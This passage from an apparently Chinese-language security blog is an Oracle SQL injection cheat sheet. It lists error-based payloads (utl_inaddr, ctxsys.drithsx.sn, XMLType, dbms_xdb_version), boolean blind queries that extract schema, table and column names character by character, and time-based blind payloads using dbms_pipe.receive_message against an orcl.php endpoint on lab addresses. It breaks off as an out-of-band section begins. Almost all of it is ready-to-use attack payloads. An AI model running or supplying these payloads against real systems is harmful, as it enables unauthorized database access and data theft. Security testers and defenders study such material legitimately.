class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="string">&#x27;username:&#x27;</span><span class="operator">||</span>NAME<span class="operator">||</span><span class="string">&#x27;age:&#x27;</span><span class="operator">||</span>AGE <span class="keyword">FROM</span> DEMO <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> dual<span class="comment">--</span></span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><ul><li><strong>utl_inaddr.get_host_name</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在<span class="number">11</span>g之前不需要任何权限，在<span class="number">11</span>g之后当前的数据库用户必须有网络访问权限</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> utl_inaddr.get_host_name( PAYLOAD位置 ) <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li><strong>ctxsys.drithsx.sn</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">处理文本的函数，传入参数错误的时会报错返回异常</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ctxsys.drithsx.sn(<span class="number">1</span>,(    PAYLOAD位置  ))<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li><strong>CTXSYS.CTX_REPORT.TOKEN_TYPE</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用于处理文本，也会出现参数错误返回异常</span><br><span class="line"><span class="keyword">select</span> CTXSYS.CTX_REPORT.TOKEN_TYPE((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual), <span class="string">&#x27;123&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure><ul><li><strong>XMLType</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XMLType是oracle系统定义的数据类型，系统预定义了内部函数去访问XML数据</span><br><span class="line"><span class="keyword">select</span> XMLType(<span class="string">&#x27;&lt;:&#x27;</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)<span class="operator">||</span><span class="string">&#x27;&gt;&#x27;</span>) <span class="keyword">from</span> dual;</span><br><span class="line">PS：调用的时候必须以<span class="operator">&lt;</span>:开头和<span class="operator">&gt;</span>结尾，即 <span class="string">&#x27;&lt;:&#x27;</span><span class="operator">||</span>balabala<span class="operator">||</span><span class="string">&#x27;&gt;&#x27;</span> 或者 chr(<span class="number">60</span>)<span class="operator">||</span>balabal<span class="operator">||</span>chr(<span class="number">62</span>）;如果返回的数据种有空格的话，会自动截断，导致数据不完整，这种情况下需要先转为 hex，再导出(或者有replace函数替换成其他非空字符)</span><br></pre></td></tr></table></figure><ul><li><strong>dbms_xdb_version.checkin</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> dbms_xdb_version.checkin(   PAYLOAD位置  ) <span class="keyword">FROM</span> DUAL) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure><ul><li><strong>dbms_xdb_version.makeversioned</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.makeversioned( PAYLOAD位置 ) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> </span><br></pre></td></tr></table></figure><ul><li><strong>dbms_xdb_version.uncheckout</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> dbms_xdb_version.uncheckout(   PAYLOAD位置  ) <span class="keyword">FROM</span> DUAL) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure><ul><li><strong>dbms_utility.sqlid_to_sqlhash</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> dbms_utility.sqlid_to_sqlhash(  PAYLOAD位置  ) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure><ul><li><strong>UTL_INADDR.get_host_name</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> UTL_INADDR.get_host_name((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure><ul><li><strong>UTL_INADDR.get_host_address</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> UTL_INADDR.get_host_name(<span class="string">&#x27;~&#x27;</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)<span class="operator">||</span><span class="string">&#x27;~&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure><ul><li><strong>ordsys.ord_dicom.getmappingxpath</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ordsys.ord_dicom.getmappingxpath( PAYLOAD位置 ,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">1</span> </span><br></pre></td></tr></table></figure><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><strong>1.判断注入</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; &quot; and 1=1 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>2.查询数据库版本/用户</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decode decode(substr((<span class="string">&#x27;abc&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><strong>length</strong> 返回字符串长度<br><strong>ascii</strong>  返回字符的ascii码<br><strong>instr</strong>  搜索指定结果内是否包含关键字 存在返回1 否则返回0</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> decode(substr((<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;O&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="keyword">from</span> dual)<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(<span class="keyword">user</span>) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">4</span><span class="comment">-- </span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">97</span><span class="comment">-- </span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">84</span><span class="comment">-- #ascii码判断字符 T</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">69</span><span class="comment">-- #ascii码判断字符 E</span></span><br></pre></td></tr></table></figure><p><strong>3.instr</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(instr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="string">&#x27;T&#x27;</span>))<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(instr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="string">&#x27;TE&#x27;</span>))<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(instr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="string">&#x27;TES&#x27;</span>))<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(instr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="string">&#x27;TEST&#x27;</span>))<span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>4.获取库名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#子查询语句法:</span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span>(OWNER)) <span class="keyword">FROM</span> SYS.ALL_TABLES)<span class="operator">=</span><span class="number">19</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> LENGTH(OWNER) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)<span class="operator">&gt;</span><span class="number">3</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> LENGTH(OWNER) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)<span class="operator">=</span><span class="number">11</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> ASCII(SUBSTR(OWNER,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)<span class="operator">&gt;</span><span class="number">10</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> ASCII(SUBSTR(OWNER,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)<span class="operator">=</span><span class="number">65</span></span><br><span class="line"></span><br><span class="line"><span class="comment">------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">#普通方法</span><br><span class="line"></span><br><span class="line">#判断 数据库数量</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span>(owner)) <span class="keyword">from</span> all_tables)<span class="operator">=</span><span class="number">19</span></span><br><span class="line">#判断 库名长度</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(owner) <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>)<span class="operator">&gt;</span><span class="number">10</span></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(OWNER) <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> OWNER <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;SYSTEM&#x27;</span>,<span class="string">&#x27;OUTLN&#x27;</span>,<span class="string">&#x27;GSMADMIN_INTERNAL&#x27;</span>) <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span>) <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span>)<span class="operator">=</span><span class="number">9</span></span><br><span class="line">#跑库名</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> owner rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> </span><br><span class="line">#跑出第一个库名 为sys后</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> owner <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;sys&#x27;</span>) <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">#跑出第二个库名为 <span class="keyword">SYSTEM</span></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> owner <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;sys&#x27;</span>,<span class="string">&#x27;SYSTEM&#x27;</span>) <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line"></span><br><span class="line">....继续跑</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>5.获取表名</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> owner<span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> table_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ADMIN&#x27;</span>,<span class="string">&#x27;USER&#x27;</span>)),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> owner<span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> table_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ADMIN&#x27;</span>,<span class="string">&#x27;USER&#x27;</span>)),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line"> </span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> owner<span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> table_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ADMIN&#x27;</span>,<span class="string">&#x27;USER&#x27;</span>)),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>6.获取字段名</strong><br>_</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(substr((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)),<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">117</span><span class="comment">-- 跑ADMIN表内的第一个字段</span></span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(substr((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)),<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">115</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">....继续跑 下一个表</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>_</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> 条件 <span class="keyword">THEN</span> 执行语句 <span class="keyword">END</span> xxx dbms_pipe.receive_message((), <span class="number">5</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> decode(substr((<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;O&#x27;</span>, dbms_pipe.receive_message(<span class="string">&#x27;ICQ&#x27;</span>, <span class="number">5</span>),<span class="number">0</span>) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">1</span><span class="comment">--截取数据库版本第一个字符为O就延时5s</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> decode(length(<span class="keyword">user</span>),<span class="number">4</span>,dbms_pipe.receive_message(<span class="string">&#x27;ICQ&#x27;</span>, <span class="number">5</span>),<span class="number">0</span>) <span class="keyword">from</span> dual) <span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br><span class="line">用户名长度为<span class="number">4</span> 就延时<span class="number">5</span>s</span><br><span class="line"># 使用延时函数</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> dbms_pipe.receive_message(<span class="string">&#x27;123&#x27;</span>,<span class="number">10</span>)</span><br><span class="line"># 使用条件语句</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> 条件 <span class="keyword">THEN</span> 执行语句 <span class="keyword">END</span> xxx</span><br><span class="line">#组成.条件成立执行延时<span class="number">10</span>S,并返回<span class="literal">true</span>,否返回<span class="literal">false</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">THEN</span> dbms_pipe.receive_message(<span class="string">&#x27;123&#x27;</span>,<span class="number">10</span>) <span class="keyword">END</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line"># 注入语句:</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">when</span> (ascii(substr((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)),<span class="number">2</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">1</span> <span class="keyword">THEN</span> dbms_pipe.receive_message(<span class="string">&#x27;123&#x27;</span>,<span class="number">5</span>) <span class="keyword">END</span> <span class="number">123</span> <span class="keyword">from</span> dual</span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (ascii(substr((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)),<span class="number">2</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">100</span> <span class="keyword">THEN</span> DBMS_PIPE.RECEIVE_MESSAGE(<span class="number">123</span>, <span class="number">5</span>) <span class="keyword">ELSE</span> <span class="number">1</span> <span class="keyword">END</span>)<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="带外查询"><a href="#带外查询" class="headerlink" title="带外查询"></a>带外查询</h3><p>所以使用OOB需要有发起网络请求的权限</p><ul><li><strong>utl_http.request</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 